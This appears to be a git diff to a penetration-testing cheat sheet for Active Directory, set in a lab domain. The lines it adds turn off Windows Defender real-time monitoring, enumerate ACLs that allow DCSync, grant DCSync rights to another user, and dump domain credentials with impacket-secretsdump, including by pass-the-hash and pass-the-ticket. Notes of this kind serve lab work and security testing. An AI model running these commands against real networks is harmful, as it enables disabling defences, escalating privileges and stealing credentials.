@@ -18,6 +18,7 @@ tags:   [Cheatsheets, Tools, Active-Directory, Active-Directory-Enumeration, SMB
 - [GPP cpassword](#gpp-cpassword)
 - [Password Spraying](#password-spraying)
 - [Runas and RunasCs.exe](#runas-and-runascsexe)
+- [Enable Running Scripts and Disable Windows Defender](#enable-running-scripts-and-disable-windows-defender)
 - [BloodHound](#bloodhound)
 - [PowerView.ps1](#powerviewps1)
 - [Impacket PsExec, WmiExec and SMBExec](#impacket-psexec-wmiexec-and-smbexec)
@@ -340,6 +341,17 @@ runas /netonly /user:vorkharium.com\john cmd
 # Using RunasCs.exe with pwnednewuser (pwnednewuser is a new user with admin rights we added before through an exploit)
 ./RunasCs.exe pwnednewuser 'password123!' "cmd /c type C:\Users\Administrator\Desktop\root.txt" --bypass-uac --logon-type '8' --force-profile
 ```
+### Enable Running Scripts and Disable Windows Defender
+```shell
+# Enable Running Scripts on PowerShell (as Administrator)
+Set-ExecutionPolicy RemoteSigned
+Set-ExecutionPolicy Unrestricted
+Get-ExecutionPolicy
+
+# Disable Windows Defender on PowerShell (as Administrator)
+Set-MpPreference -DisableRealtimeMonitoring $true
+Get-MpPreference | Select-Object -Property DisableRealtimeMonitoring
+```
 ### BloodHound
 ```shell
 # BloodHound Collectors
@@ -369,21 +381,29 @@ sudo bloodhound
 ```
 ### PowerView.ps1
 ```shell
-# Enable Running Scripts on PowerShell (as Administrator)
-Set-ExecutionPolicy RemoteSigned
-Set-ExecutionPolicy Unrestricted
-Get-ExecutionPolicy
 
 # Get Domain User Information
 Import-Module .\PowerView.ps1
 $Cred = Get-Credential -UserName "vorkharium.com\john"
-# Enter password
+# It will ask for user "john" password here. Enter it manually
 Get-DomainUser -Identity "john" -Credential $Cred -Verbose
 
 # Detect Kerberoastable Account
 $Pass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('vorkharium.com\john, $Pass')
 Get-DomainUser -SPN -Domain vorkharium.com -Credential $Cred | select SamAccountName
+
+# Enumerate ACLs with NameToSid
+$sid = Convert-NameToSid -Name john
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+# Detect Objects with ACLs (GenericAll) to perform DCSync
+Get-ObjectAcl -DistinguishedName "dc=vorkharium,dc=com" -ResolveGUIDs | 
+Where {	$_.ObjectType -match 'replication-get' -or $_.ActiveDirectoryRights -match 'GenericAll' }
+
+# Enumerate ACLs
+$sid = Convert-NameToSid -Name john
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
 ```
 For a complete and detailed list of all PowerView.ps1 commands check the following link:
 https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
@@ -472,6 +492,32 @@ sudo john jane_hash.txt --show
 ```
 ### DCSync
 ```shell
+# To be able to DCSync, the user needs to have these 3 permissions:
+DS-Replication-Get-Changes
+Replicating Directory Changes All
+Replicating Directory Changes In Filtered Set
+
+# Enumerating DCSync user permissions with PowerView.ps1
+Get-ObjectAcl -DistinguishedName "dc=vorkharium,dc=com" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
+
+# Granting DCSync rights to any user using the Domain Admin user john and PowerView.ps1
+$Pass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('vorkharium.com\john, $Pass')
+Add-ObjectAcl -TargetDistinguishedName "dc=vorkharium,dc=com" -PrincipalSamAccountName newlyoverpowereduser -Rights DCSync -Verbose
+# Check if the user successfully got DCSync rights
+Get-ObjectAcl -DistinguishedName "dc=vorkharium,dc=com" -ResolveGUIDs | ?{$_.IdentityReference -match "newlyoverpowereduser"}
+
+# Remote DCSync
+# With password
+impacket-secretsdump -outputfile dcsync.txt vorkharium.com/john:'Password123!'@172.16.150.10
+
+# With hash
+impacket-secretsdump -outputfile dcsync.txt -hashes :1a06b4248879e68a498d3bac51bf91c9 vorkharium.com/john@172.16.150.10
+
+# Pass-the-Ticket
+impacket-getTGT -dc-ip 172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 'vorkharium.com/john@172.16.150.10'
+export KRB5CCNAME='username.ccache'
+impacket-secretsdump -k -outputfile dcsync.txt "vorkharium.com/john:'Password123!'@172.16.150.10"
 ```
 ### Remote Credential Dumping
 ```shell
@@ -479,7 +525,7 @@ sudo john jane_hash.txt --show
 # With password
 impacket-secretsdump vorkharium.com/john:'Password123!'@172.16.150.10
 # Using hash
-impacket-secretsdump Administrator:@172.16.150.10 --hashes :1a06b4248879e68a498d3bac51bf91c9
+impacket-secretsdump Administrator:@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9
 
 # Example with -just-dc-user
 impacket-secretsdump -just-dc-user jane vorkharium.com/john:"Password123!"@172.16.150.10
